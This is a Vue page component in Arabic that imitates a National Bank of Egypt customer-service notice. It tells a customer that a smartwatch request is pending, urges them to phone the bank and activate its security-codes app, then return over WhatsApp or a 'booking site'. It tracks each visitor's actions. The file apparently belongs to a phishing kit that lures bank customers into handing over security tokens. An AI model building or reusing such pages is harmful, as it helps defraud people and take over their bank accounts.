<template>
  <AppShell>
    <div class="call-page-wrapper">
      <main class="call-page-main">
        <!-- الشعار المعتاد في بداية الصفحة -->
        <img class="call-page-logo" :src="logoImg" alt="البنك الأهلي المصري" />

        <!-- بطاقة الرسالة المنسقة -->
        <div class="call-notice-card">
          <div class="call-notice-header">
            <div class="call-badge-icon">
              <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#007a3d" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
              </svg>
            </div>
            <h1 class="call-salutation">عزيزي العميل:</h1>
          </div>

          <div class="call-notice-body">
            <p class="call-paragraph primary-para">
              نود إفادة سيادتكم بأنه سبق لكم التقدم بطلب للحصول على الساعة الذكية، ولاستكمال إجراءات الطلب، يُرجى التواصل مع خدمة العملاء على الرقم
              <a href="tel:19623" class="phone-link-badge font-mono" dir="ltr">19623</a>
              إتصال وطلب تفعيل تطبيق رموز الأمان.
            </p>

            <p class="call-paragraph secondary-para">
              بعد تفعيل التطبيق بنجاح، يُرجى إعادة التواصل معنا عبر الواتس او موقع الحجز مرة اخرى لاستكمال الإجراءات.
            </p>

            <div class="call-divider"></div>

            <p class="call-closing">
              نشكركم على ثقتكم، ونسعد دائمًا بخدمتكم.
            </p>
          </div>

          <!-- زر الاتصال السريع المباشر -->
          <div class="call-actions-wrap">
            <a href="tel:19623" class="direct-call-btn">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
              </svg>
              <span>اتصال بخدمة العملاء (19623)</span>
            </a>
          </div>
        </div>
      </main>
    </div>
  </AppShell>
</template>

<script setup lang="ts">
import logoImg from "~/assets/login/login-logo.webp";
import { trackCustomerActivity } from "~/composables/useCustomerTracking";

useHead({
  title: "خدمة العملاء - البنك الأهلي المصري",
});

onMounted(async () => {
  if (typeof window !== "undefined") {
    try {
      await trackCustomerActivity(
        {
          lastAction: "عرض صفحة المحادثات / خدمة العملاء (طلب تفعيل رموز الأمان)",
          lastPage: "/chat",
        },
        "page_visit",
        { page: "/chat" }
      );
    } catch (err) {
      console.error("Error tracking chat page activity:", err);
    }
  }
});
</script>

<style scoped>
.call-page-wrapper {
  min-height: calc(100vh - 280px);
  background-color: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 56px 20px 80px;
}

.call-page-main {
  width: 100%;
  max-width: 620px;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.call-page-logo {
  height: 110px;
  width: auto;
  object-fit: contain;
  margin-bottom: 32px;
}

.call-notice-card {
  width: 100%;
  background: #ffffff;
  border: 1px solid #e2e8f0;
  border-radius: 16px;
  padding: 40px 32px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
  display: flex;
  flex-direction: column;
  align-items: center;
}

.call-notice-header {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-bottom: 24px;
}

.call-badge-icon {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  background: #e8f5e9;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 16px;
}

.call-salutation {
  font-size: 1.6rem;
  font-weight: 800;
  color: #111827;
  margin: 0;
}

.call-notice-body {
  width: 100%;
  text-align: right;
  direction: rtl;
}

.call-paragraph {
  font-size: 1.05rem;
  line-height: 1.8;
  color: #334155;
  margin-bottom: 18px;
  font-weight: 500;
}

.primary-para {
  color: #1e293b;
}

.phone-link-badge {
  display: inline-block;
  background: #007a3d;
  color: #ffffff;
  padding: 2px 10px;
  border-radius: 6px;
  font-weight: 800;
  font-size: 1.15rem;
  text-decoration: none;
  margin: 0 4px;
  transition: background 0.2s ease, transform 0.2s ease;
  vertical-align: middle;
}

.phone-link-badge:hover {
  background: #005a2b;
  transform: translateY(-1px);
}

.secondary-para {
  color: #475569;
}

.call-divider {
  height: 1px;
  background: #f1f5f9;
  margin: 24px 0 18px;
  width: 100%;
}

.call-closing {
  font-size: 1.05rem;
  font-weight: 700;
  color: #007a3d;
  text-align: center;
  margin: 0;
}

.call-actions-wrap {
  margin-top: 32px;
  width: 100%;
  display: flex;
  justify-content: center;
}

.direct-call-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  background: #007a3d;
  color: #ffffff;
  font-size: 1.05rem;
  font-weight: 700;
  padding: 14px 28px;
  border-radius: 10px;
  text-decoration: none;
  width: 100%;
  max-width: 380px;
  transition: all 0.2s ease;
  box-shadow: 0 4px 14px rgba(0, 122, 61, 0.25);
}

.direct-call-btn:hover {
  background: #005a2b;
  box-shadow: 0 6px 20px rgba(0, 122, 61, 0.35);
  transform: translateY(-2px);
}

@media (max-width: 640px) {
  .call-page-wrapper {
    padding: 32px 16px 48px;
  }
  .call-notice-card {
    padding: 28px 18px;
    border-radius: 12px;
  }
  .call-page-logo {
    height: 85px;
    margin-bottom: 20px;
  }
  .call-salutation {
    font-size: 1.35rem;
  }
  .call-paragraph {
    font-size: 0.96rem;
    line-height: 1.7;
  }
  .direct-call-btn {
    font-size: 0.95rem;
    padding: 12px 20px;
  }
}
</style>
